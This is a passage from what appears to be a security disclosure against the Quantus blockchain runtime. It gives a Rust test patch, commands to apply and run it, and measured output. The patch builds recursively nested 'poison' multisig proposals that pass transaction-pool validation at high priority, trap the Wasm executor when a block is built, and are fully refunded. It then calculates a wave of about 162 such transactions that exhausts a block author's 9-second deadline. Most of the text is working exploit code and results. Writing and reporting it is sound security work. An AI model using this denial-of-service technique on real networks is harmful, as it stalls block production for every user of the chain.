+	let bounded: BoundedVec<u8, quantus_runtime::configs::MaxCallSize> =
+		poison_bytes().try_into().unwrap();
+	RuntimeCall::Multisig(pallet_multisig::Call::<Runtime>::propose {
+		multisig_address: multisig,
+		call: bounded,
+		expiry,
+	})
+}
+
+fn poison_xt(pair: &Dilithium65Pair, multisig: sp_runtime::AccountId32) -> UncheckedExtrinsic {
+	sign(pair, poison_call(multisig, 100), 0)
+}
+
+#[test]
+fn pool_validation_accepts_signed_poison() {
+	let (mut ext, pair, multisig) = setup();
+	ext.execute_with(|| {
+		let xt = poison_xt(&pair, multisig);
+		let validity: TransactionValidity =
+			Executive::validate_transaction(TransactionSource::External, xt, System::block_hash(0));
+		let valid = validity.expect("signed poison is admitted by runtime pool validation");
+		eprintln!("POOL_VALIDITY_OK=true");
+		eprintln!("POOL_PRIORITY={}", valid.priority);
+		eprintln!("POOL_PROPAGATE={}", valid.propagate);
+	});
+}
+
+/// Construct a conservative double-buffered wave. This proves the runtime accepts every signed
+/// variant with a unique nonce tag, propagates it, and assigns the measured high priority; it does
+/// not merely replay one hash through validation. Four multisigs cover 340 signers at MaxSigners=100.
+#[test]
+fn pool_validation_accepts_340_independent_high_priority_poisons() {
+	const COUNT: usize = 340;
+	let pairs: Vec<_> = (0..COUNT)
+		.map(|i| {
+			let mut seed = [0u8; 32];
+			seed[..8].copy_from_slice(&(i as u64 + 1).to_le_bytes());
+			Dilithium65Pair::from_seed_slice(&seed).unwrap()
+		})
+		.collect();
+	let accounts: Vec<sp_runtime::AccountId32> =
+		pairs.iter().map(|pair| pair.public().into_account()).collect();
+	let storage = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
+	let mut ext = sp_io::TestExternalities::new(storage);
+
+	let multisigs: Vec<_> = ext.execute_with(|| {
+		System::set_block_number(1);
+		for account in &accounts {
+			Balances::make_free_balance_be(account, 2 * UNIT);
+		}
+		accounts
+			.chunks(100)
+			.enumerate()
+			.map(|(chunk_index, chunk)| {
+				let signers = chunk.to_vec();
+				let creation_nonce = 1_001 + chunk_index as u64;
+				assert_ok!(Multisig::create_multisig(
+					RuntimeOrigin::signed(signers[0].clone()),
+					signers.clone(),
+					2,
+					creation_nonce,
+				));
+				Multisig::derive_multisig_address(&signers, 2, creation_nonce)
+			})
+			.collect()
+	});
+
+	ext.execute_with(|| {
+		let tip = UNIT / 1_000_000;
+		let mut total_bytes = 0usize;
+		let mut unique_provides = BTreeSet::new();
+		let mut observed_priority = None;
+		for (i, pair) in pairs.iter().enumerate() {
+			let xt = sign_with_tip(
+				pair,
+				poison_call(multisigs[i / 100].clone(), 100 + i as u32),
+				0,
+				tip,
+			);
+			total_bytes += xt.encode().len();
+			let valid = Executive::validate_transaction(
+				TransactionSource::External,
+				xt,
+				System::block_hash(0),
+			)
+			.expect("every independently signed poison must validate");
+			assert!(valid.propagate);
+			assert!(valid.requires.is_empty(), "nonce zero must be independently ready");
+			assert_eq!(valid.provides.len(), 1);
+			assert!(unique_provides.insert(valid.provides[0].clone()));
+			match observed_priority {
+				None => observed_priority = Some(valid.priority),
+				Some(priority) => assert_eq!(valid.priority, priority),
+			}
+		}
+		eprintln!("WAVE_VALID_TRANSACTIONS={COUNT}");
+		eprintln!("WAVE_UNIQUE_READY_TAGS={}", unique_provides.len());
+		eprintln!("WAVE_TOTAL_BYTES={total_bytes}");
+		eprintln!("WAVE_PRIORITY={}", observed_priority.unwrap());
+		eprintln!("WAVE_MULTISIGS={}", multisigs.len());
+		assert_eq!(unique_provides.len(), COUNT);
+	});
+}
+
+/// Run alone: native test executor aborts with stack overflow inside `propose` decode.
+#[test]
+#[ignore = "intentionally aborts the test process; production uses the contained Wasm test"]
+fn native_apply_extrinsic_overflows() {
+	let (mut ext, pair, multisig) = setup();
+	ext.execute_with(|| {
+		let xt = poison_xt(&pair, multisig);
+		eprintln!("APPLYING_SIGNED_POISON");
+		let result = Executive::apply_extrinsic(xt);
+		eprintln!("UNEXPECTED_NATIVE_RESULT={result:?}");
+	});
+}
+
+/// Exercise the same Wasmtime executor type used by the shipped node. Recursive decode must be
+/// surfaced as a contained executor memory trap rather than aborting this native process.
+#[test]
+fn wasm_pool_accepts_then_apply_traps_safely() {
+	let (mut ext, pair, multisig) = setup();
+	let xt = ext.execute_with(|| poison_xt(&pair, multisig));
+	let encoded_xt = xt.encode();
+	let wasm =
+		quantus_runtime::WASM_BINARY.expect("build runtime Wasm (do not set SKIP_WASM_BUILD)");
+	let executor = WasmExecutor::<sp_io::SubstrateHostFunctions>::builder().build();
+
+	// Runtime API pool validation, through Wasmtime, sees only the opaque BoundedVec bytes.
+	let validate_args =
+		(TransactionSource::External, xt.clone(), ext.execute_with(|| System::block_hash(0)))
+			.encode();
+	let validate_result = executor.uncached_call(
+		RuntimeBlob::uncompress_if_needed(wasm).unwrap(),
+		&mut ext.ext(),
+		false,
+		"TaggedTransactionQueue_validate_transaction",
+		&validate_args,
+	);
+	assert!(validate_result.is_ok(), "Wasm validation runtime call itself must succeed");
+	let validity = TransactionValidity::decode(&mut &validate_result.unwrap()[..]).unwrap();
+	let valid = validity.expect("Wasm pool validation admits poison");
+	eprintln!("WASM_VALIDITY_OK=true");
+	eprintln!("WASM_VALIDITY_PRIORITY={}", valid.priority);
+	eprintln!("WASM_VALIDITY_PROPAGATE={}", valid.propagate);
+
+	// The block-builder call executes propose(), recursively decodes its opaque bytes, and traps.
+	let started = std::time::Instant::now();
+	let apply_result = executor.uncached_call(
+		RuntimeBlob::uncompress_if_needed(wasm).unwrap(),
+		&mut ext.ext(),
+		false,
+		"BlockBuilder_apply_extrinsic",
+		&encoded_xt,
+	);
+	let elapsed = started.elapsed();
+	eprintln!("WASM_APPLY_ELAPSED={elapsed:?}");
+	eprintln!("WASM_APPLY_IS_ERR={}", apply_result.is_err());
+	assert_wasm_oob_trap(&apply_result, "WASM_APPLY_ERROR");
+
+	// A trap is contained by Wasmtime: the same host process/executor remains usable.
+	let followup = executor.uncached_call(
+		RuntimeBlob::uncompress_if_needed(wasm).unwrap(),
+		&mut ext.ext(),
+		false,
+		"Core_version",
+		&[],
+	);
+	eprintln!("WASM_FOLLOWUP_CORE_VERSION_OK={}", followup.is_ok());
+	assert!(followup.is_ok(), "Wasm trap must not kill or poison the node executor");
+}
+
+/// Production-like cached WasmExecutor path (`CodeExecutor::call`), used to isolate execution
+/// time from Wasmtime module compilation done by `uncached_call`.
+#[test]
+fn cached_wasm_apply_trap_timing_and_recovery() {
+	let (mut ext, pair, multisig) = setup();
+	let xt = ext.execute_with(|| poison_xt(&pair, multisig));
+	let wasm = quantus_runtime::WASM_BINARY.expect("build runtime Wasm");
+	let fetcher = WrappedRuntimeCode(Cow::Borrowed(wasm));
+	let runtime_code = RuntimeCode {
+		code_fetcher: &fetcher,
+		heap_pages: None,
+		hash: sp_core::blake2_256(wasm).to_vec(),
+	};
+	let executor = WasmExecutor::<sp_io::SubstrateHostFunctions>::builder().build();
+
+	// Warm/compile exactly as normal pool validation does before authoring.
+	let validate_args =
+		(TransactionSource::External, xt.clone(), ext.execute_with(|| System::block_hash(0)))
+			.encode();
+	let warm_start = std::time::Instant::now();
+	let (validation, _) = CodeExecutor::call(
+		&executor,
+		&mut ext.ext(),
+		&runtime_code,
+		"TaggedTransactionQueue_validate_transaction",
+		&validate_args,
+		CallContext::Onchain,
+	);
+	eprintln!("CACHED_WASM_WARM_VALIDATE_ELAPSED={:?}", warm_start.elapsed());
+	assert!(validation.is_ok());
+
+	let started = std::time::Instant::now();
+	let (apply, _) = CodeExecutor::call(
+		&executor,
+		&mut ext.ext(),
+		&runtime_code,
+		"BlockBuilder_apply_extrinsic",
+		&xt.encode(),
+		CallContext::Onchain,
+	);
+	eprintln!("CACHED_WASM_APPLY_ELAPSED={:?}", started.elapsed());
+	eprintln!("CACHED_WASM_APPLY_IS_ERR={}", apply.is_err());
+	assert_wasm_oob_trap(&apply, "CACHED_WASM_APPLY_ERROR");
+
+	let recovery_start = std::time::Instant::now();
+	let (followup, _) = CodeExecutor::call(
+		&executor,
+		&mut ext.ext(),
+		&runtime_code,
+		"Core_version",
+		&[],
+		CallContext::Onchain,
+	);
+	eprintln!("CACHED_WASM_RECOVERY_ELAPSED={:?}", recovery_start.elapsed());
+	assert!(followup.is_ok());
+}
+
+#[test]
+fn tipped_poison_outranks_default_transfer_but_not_higher_bid() {
+	let (mut ext, pair, multisig) = setup();
+	ext.execute_with(|| {
+		let tip = UNIT / 1_000_000; // one micro-QUAN; rolled back when production Wasm traps
+		let poison = sign_with_tip(&pair, poison_call(multisig, 100), 0, tip);
+		let len = poison.encode().len() as u32;
+		let info = poison.get_dispatch_info();
+		let declared_fee =
+			pallet_transaction_payment::Pallet::<Runtime>::compute_fee(len, &info, tip);
+		let at = System::block_hash(0);
+		let poison_validity =
+			Executive::validate_transaction(TransactionSource::External, poison, at)
+				.expect("tipped poison validates");
+
+		let transfer_call: RuntimeCall = BalancesCall::transfer_keep_alive {
+			dest: MultiAddress::Id(sp_runtime::AccountId32::new([99u8; 32])),
+			value: UNIT,
+		}
+		.into();
+		let normal_validity = Executive::validate_transaction(
+			TransactionSource::External,
+			sign(&pair, transfer_call.clone(), 0),
+			at,
+		)
+		.expect("default transfer validates");
+		let higher_bid_validity = Executive::validate_transaction(
+			TransactionSource::External,
+			sign_with_tip(&pair, transfer_call, 0, 6_802),
+			at,
+		)
+		.expect("higher-bid transfer validates");
+
+		eprintln!("POISON_XT_BYTES={len}");
+		eprintln!("HIGH_TIP_POISON_DECLARED_FEE={declared_fee}");
+		eprintln!("HIGH_TIP_POISON_PRIORITY={}", poison_validity.priority);
+		eprintln!("NORMAL_TRANSFER_PRIORITY={}", normal_validity.priority);
+		eprintln!("TIP_6802_TRANSFER_PRIORITY={}", higher_bid_validity.priority);
+		assert!(poison_validity.priority > normal_validity.priority);
+		assert!(higher_bid_validity.priority > poison_validity.priority);
+	});
+}
+
+/// Hardware-portable cost model for proposer starvation. Run explicitly with `--ignored`.
+/// Uses the production-shaped overlay boundary and reuses one signed tx only to measure each
+/// `BlockBuilder::push` trap; an actual pool wave uses independent signer/nonce tags. The test
+/// computes the wave required on this host and proves it fits the frozen default pool byte/count
+/// limits instead of assuming that one fixed count exceeds nine seconds on every machine.
+#[test]
+#[ignore]
+fn cached_wasm_rolled_back_poison_cost_models_author_deadline() {
+	const COUNT: usize = 340;
+	let (mut setup_ext, pair, multisig) = setup();
+	let signer = pair.public().into_account();
+	let tip = UNIT / 1_000_000;
+	let xt = setup_ext.execute_with(|| sign_with_tip(&pair, poison_call(multisig, 100), 0, tip));
+	let encoded = xt.encode();
+	let backend = setup_ext.as_backend();
+	let mut overlay = OverlayedChanges::default();
+	let wasm = quantus_runtime::WASM_BINARY.expect("build runtime Wasm");
+	let fetcher = WrappedRuntimeCode(Cow::Borrowed(wasm));
+	let runtime_code = RuntimeCode {
+		code_fetcher: &fetcher,
+		heap_pages: None,
+		hash: sp_core::blake2_256(wasm).to_vec(),
+	};
+	let executor = WasmExecutor::<sp_io::SubstrateHostFunctions>::builder().build();
+
+	// Warm the module cache outside the measurement.
+	overlay.enter_runtime().unwrap();
+	let (warm, _) = {
+		let mut externalities = Ext::new(&mut overlay, &backend, None);
+		CodeExecutor::call(
+			&executor,
+			&mut externalities,
+			&runtime_code,
+			"Core_version",
+			&[],
+			CallContext::Onchain,
+		)
+	};
+	overlay.exit_runtime().unwrap();
+	assert!(warm.is_ok());
+	let before = read_overlay_state(&mut overlay, &backend, &signer);
+
+	// This measures the complete production-shaped failed-push boundary: host transaction,
+	// Wasm apply/trap, runtime-transaction cleanup, then host rollback. One signed transaction is
+	// reused only for timing; a pool wave needs independent signer/nonces and has the same apply.
+	let started = std::time::Instant::now();
+	for i in 0..COUNT {
+		overlay.start_transaction();
+		overlay.enter_runtime().unwrap();
+		let (result, _) = {
+			let mut externalities = Ext::new(&mut overlay, &backend, None);
+			CodeExecutor::call(
+				&executor,
+				&mut externalities,
+				&runtime_code,
+				"BlockBuilder_apply_extrinsic",
+				&encoded,
+				CallContext::Onchain,
+			)
+		};
+		overlay.exit_runtime().unwrap();
+		if i == 0 {
+			assert_wasm_oob_trap(&result, "STRESS_FIRST_APPLY_ERROR");
+		} else if !result.is_err() {
+			panic!("expected trap at iteration {i}: {result:?}");
+		}
+		overlay.rollback_transaction().unwrap();
+	}
+	let elapsed = started.elapsed();
+	let after = read_overlay_state(&mut overlay, &backend, &signer);
+	let average_nanos = (elapsed.as_nanos() / COUNT as u128).max(1);
+	let deadline_nanos = std::time::Duration::from_secs(9).as_nanos();
+	let required_for_nine_seconds = deadline_nanos.div_ceil(average_nanos);
+	let default_pool_count = 36_772usize;
+	let default_pool_bytes = 262_144usize * 1024;
+	let byte_limited_count = default_pool_bytes / encoded.len();
+	let supported_wave = default_pool_count.min(byte_limited_count);
+
+	eprintln!("ROLLED_BACK_POISONS={COUNT}");
+	eprintln!("ROLLED_BACK_POISONS_ELAPSED={elapsed:?}");
+	eprintln!("ROLLED_BACK_POISON_AVG={:?}", elapsed / COUNT as u32);
+	eprintln!("MEASURED_POISONS_TO_EXHAUST_9S={required_for_nine_seconds}");
+	eprintln!("DEFAULT_POOL_BYTE_LIMIT_POISONS={byte_limited_count}");
+	eprintln!("DEFAULT_POOL_SUPPORTED_WAVE={supported_wave}");
+	eprintln!("ROLLED_BACK_POISONS_STATE_IDENTICAL={}", after == before);
+	assert_eq!(after, before);
+	assert!(
+		required_for_nine_seconds <= supported_wave as u128,
+		"the measured deadline wave must fit the frozen default pool limits",
+	);
+}
+
+type State = (u128, u128, u32, frame_support::weights::Weight, usize);
+
+/// Query state through the same overlay/backend split used by the client state machine.
+fn read_overlay_state(
+	overlay: &mut OverlayedChanges<sp_core::Blake2Hasher>,
+	backend: &InMemoryBackend<sp_core::Blake2Hasher>,
+	signer: &sp_runtime::AccountId32,
+) -> State {
+	overlay.enter_runtime().unwrap();
+	let value = {
+		let mut externalities = Ext::new(overlay, backend, None);
+		sp_externalities::set_and_run_with_externalities(&mut externalities, || {
+			(
+				Balances::free_balance(signer),
+				Balances::reserved_balance(signer),
+				System::account_nonce(signer),
+				System::block_weight().total(),
+				System::events().len(),
+			)
+		})
+	};
+	overlay.exit_runtime().unwrap();
+	value
+}
+
+#[test]
+fn wasm_trap_host_overlay_rolls_back_fee_nonce_and_weight() {
+	let (mut setup_ext, pair, multisig) = setup();
+	let signer = pair.public().into_account();
+	let tip = UNIT / 1_000_000;
+	let xt = setup_ext.execute_with(|| sign_with_tip(&pair, poison_call(multisig, 100), 0, tip));
+	let encoded = xt.encode();
+	let declared_fee = setup_ext.execute_with(|| {
+		pallet_transaction_payment::Pallet::<Runtime>::compute_fee(
+			encoded.len() as u32,
+			&xt.get_dispatch_info(),
+			tip,
+		)
+	});
+	let genesis_hash = setup_ext.execute_with(|| System::block_hash(0));
+	let backend = setup_ext.as_backend();
+	let mut overlay = OverlayedChanges::default();
+	let wasm = quantus_runtime::WASM_BINARY.expect("build runtime Wasm");
+	let fetcher = WrappedRuntimeCode(Cow::Borrowed(wasm));
+	let runtime_code = RuntimeCode {
+		code_fetcher: &fetcher,
+		heap_pages: None,
+		hash: sp_core::blake2_256(wasm).to_vec(),
+	};
+	let executor = WasmExecutor::<sp_io::SubstrateHostFunctions>::builder().build();
+
+	// Warm the module through the cached CodeExecutor::call path. StateMachine brackets every
+	// runtime entry with enter_runtime/exit_runtime; exit_runtime then discards any dangling
+	// FRAME transaction left by the trap.
+	overlay.enter_runtime().unwrap();
+	let (warm, _) = {
+		let mut externalities = Ext::new(&mut overlay, &backend, None);
+		CodeExecutor::call(
+			&executor,
+			&mut externalities,
+			&runtime_code,
+			"Core_version",
+			&[],
+			CallContext::Onchain,
+		)
+	};
+	overlay.exit_runtime().unwrap();
+	assert!(warm.is_ok());
+
+	let before = read_overlay_state(&mut overlay, &backend, &signer);
+
+	// This is the host-side overlay transaction opened by RuntimeApi::execute_in_transaction in
+	// sc-block-builder::BlockBuilder::push. It is deliberately distinct from runtime storage
+	// transactions (e.g. FRAME's transactional pallet dispatch).
+	overlay.start_transaction();
+	overlay.enter_runtime().unwrap();
+	let started = std::time::Instant::now();
+	let (apply, _) = {
+		let mut externalities = Ext::new(&mut overlay, &backend, None);
+		CodeExecutor::call(
+			&executor,
+			&mut externalities,
+			&runtime_code,
+			"BlockBuilder_apply_extrinsic",
+			&encoded,
+			CallContext::Onchain,
+		)
+	};
+	let elapsed = started.elapsed();
+	// This cleanup is performed by the state machine when control returns after the trap. It rolls
+	// back the dangling runtime transaction without touching the protected host transaction.
+	overlay.exit_runtime().unwrap();
+	assert_wasm_oob_trap(&apply, "HOST_ROLLBACK_APPLY_ERROR");
+
+	// Transaction extensions prepare before dispatch, so changes exist inside the still-open host
+	// transaction even though the pallet never returns.
+	let tentative = read_overlay_state(&mut overlay, &backend, &signer);
+	eprintln!("HOST_ROLLBACK_BEFORE={before:?}");
+	eprintln!("HOST_ROLLBACK_TENTATIVE={tentative:?}");
+	eprintln!("HOST_ROLLBACK_TRAP_ELAPSED={elapsed:?}");
+	eprintln!("HOST_ROLLBACK_TENTATIVE_FEE={}", before.0 - tentative.0);
+	eprintln!("HOST_ROLLBACK_DECLARED_FEE={declared_fee}");
+	assert_eq!(tentative.2, before.2 + 1, "CheckNonce prepared before trap");
+	assert_eq!(before.0 - tentative.0, declared_fee, "full fee including tip was withdrawn");
+	assert!(tentative.3.ref_time() > before.3.ref_time(), "weight was tentatively recorded");
+
+	// Runtime API Err makes BlockBuilder::push select TransactionOutcome::Rollback.
+	overlay.rollback_transaction().unwrap();
+	let after = read_overlay_state(&mut overlay, &backend, &signer);
+	eprintln!("HOST_ROLLBACK_AFTER={after:?}");
+	eprintln!("HOST_ROLLBACK_FEE_REFUNDED={}", after.0 == before.0);
+	eprintln!("HOST_ROLLBACK_TIP_REFUNDED={}", after.0 == before.0);
+	eprintln!("HOST_ROLLBACK_NONCE_REUSABLE={}", after.2 == before.2);
+	eprintln!("HOST_ROLLBACK_WEIGHT_FREE={}", after.3 == before.3);
+	assert_eq!(after, before, "failed block-builder push must leave no state");
+	let overlay_top_keys = overlay.changes().count();
+	let overlay_child_keys: usize = overlay.children().map(|(changes, _)| changes.count()).sum();
+	eprintln!("HOST_ROLLBACK_OVERLAY_TOP_KEYS={overlay_top_keys}");
+	eprintln!("HOST_ROLLBACK_OVERLAY_CHILD_KEYS={overlay_child_keys}");
+	assert_eq!(overlay_top_keys, 0, "all tentative top-storage writes rolled back");
+	assert_eq!(overlay_child_keys, 0, "all tentative child-storage writes rolled back");
+
+	// Same nonce-zero signed extrinsic remains valid after rollback, at its tipped priority.
+	let validate_args = (TransactionSource::External, xt, genesis_hash).encode();
+	overlay.enter_runtime().unwrap();
+	let (validation, _) = {
+		let mut externalities = Ext::new(&mut overlay, &backend, None);
+		CodeExecutor::call(
+			&executor,
+			&mut externalities,
+			&runtime_code,
+			"TaggedTransactionQueue_validate_transaction",
+			&validate_args,
+			CallContext::Onchain,
+		)
+	};
+	overlay.exit_runtime().unwrap();
+	let validity = TransactionValidity::decode(&mut &validation.unwrap()[..]).unwrap();
+	eprintln!("HOST_ROLLBACK_REVALIDITY={validity:?}");
+	assert!(validity.is_ok());
+}
PATCH

git apply --check /tmp/quantus-multisig-depth-wasm-poison-poc-v5.patch
git apply /tmp/quantus-multisig-depth-wasm-poison-poc-v5.patch

# Keep build products outside the checkout and force a real frozen-runtime Wasm build.
export CARGO_TARGET_DIR="$(mktemp -d /tmp/quantus-depth-target.XXXXXX)"
export WASM_BUILD_WORKSPACE_HINT="$(pwd -P)"
unset SKIP_WASM_BUILD

# Safe functional suite. This builds the frozen runtime Wasm and leaves both opt-in
# controls (the native-abort demonstration and the longer stress loop) ignored.
cargo test -p quantus-runtime --test depth_pipeline_poc -- \
  --nocapture --test-threads=1

# Explicit, hardware-portable deadline cost model through the warmed production Wasm executor.
cargo test -p quantus-runtime --test depth_pipeline_poc \
  cached_wasm_rolled_back_poison_cost_models_author_deadline -- \
  --ignored --nocapture --test-threads=1
```

The patch SHA-256 is:

```
81be376e060da1b07779b0532bab0bc705d6ad9a91599b483c9454f6be546045
```

I also verified `git apply --check` and applied this exact patch in a second clean detached worktree at the frozen commit. The 340-entry wave test passed there independently.

### Observed functional-suite output

The following is the concise relevant output from the complete safe suite on the stated Darwin ARM64 host:

```
running 8 tests
test cached_wasm_apply_trap_timing_and_recovery ... ok
test cached_wasm_rolled_back_poison_cost_models_author_deadline ... ignored
test native_apply_extrinsic_overflows ... ignored, intentionally aborts the test process; production uses the contained Wasm test
test pool_validation_accepts_340_independent_high_priority_poisons ... ok
test pool_validation_accepts_signed_poison ... ok
test tipped_poison_outranks_default_transfer_but_not_higher_bid ... ok
test wasm_pool_accepts_then_apply_traps_safely ... ok
test wasm_trap_host_overlay_rolls_back_fee_nonce_and_weight ... ok

test result: ok. 6 passed; 0 failed; 2 ignored; 0 measured; 0 filtered out

CACHED_WASM_APPLY_ELAPSED=55.639167ms
CACHED_WASM_APPLY_IS_ERR=true
CACHED_WASM_APPLY_ERROR_IS_OOB_TRAP=true
CACHED_WASM_RECOVERY_ELAPSED=143.125µs
WAVE_VALID_TRANSACTIONS=340
WAVE_UNIQUE_READY_TAGS=340
WAVE_TOTAL_BYTES=5298560
WAVE_PRIORITY=5000005
WAVE_MULTISIGS=4
POOL_VALIDITY_OK=true
POOL_PRIORITY=5
POOL_PROPAGATE=true
HIGH_TIP_POISON_DECLARED_FEE=1016491093201
HIGH_TIP_POISON_PRIORITY=5000005
NORMAL_TRANSFER_PRIORITY=735
TIP_6802_TRANSFER_PRIORITY=5000205
WASM_VALIDITY_OK=true
WASM_VALIDITY_PRIORITY=5
WASM_VALIDITY_PROPAGATE=true
WASM_APPLY_IS_ERR=true
WASM_APPLY_ERROR_IS_OOB_TRAP=true
WASM_FOLLOWUP_CORE_VERSION_OK=true
HOST_ROLLBACK_APPLY_ERROR_IS_OOB_TRAP=true
HOST_ROLLBACK_TENTATIVE_FEE=1016491093201
HOST_ROLLBACK_DECLARED_FEE=1016491093201
HOST_ROLLBACK_FEE_REFUNDED=true
HOST_ROLLBACK_TIP_REFUNDED=true
HOST_ROLLBACK_NONCE_REUSABLE=true
HOST_ROLLBACK_WEIGHT_FREE=true
HOST_ROLLBACK_OVERLAY_TOP_KEYS=0
HOST_ROLLBACK_OVERLAY_CHILD_KEYS=0
HOST_ROLLBACK_REVALIDITY=Ok(ValidTransaction { priority: 5000005, requires: [], provides: [...nonce 0...], longevity: 18446744073709551613, propagate: true })
```

### Observed stress output

```
running 1 test
test cached_wasm_rolled_back_poison_cost_models_author_deadline ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 7 filtered out

STRESS_FIRST_APPLY_ERROR_IS_OOB_TRAP=true
ROLLED_BACK_POISONS=340
ROLLED_BACK_POISONS_ELAPSED=18.950986709s
ROLLED_BACK_POISON_AVG=55.738196ms
MEASURED_POISONS_TO_EXHAUST_9S=162
DEFAULT_POOL_BYTE_LIMIT_POISONS=17225
DEFAULT_POOL_SUPPORTED_WAVE=17225
ROLLED_BACK_POISONS_STATE_IDENTICAL=true
```
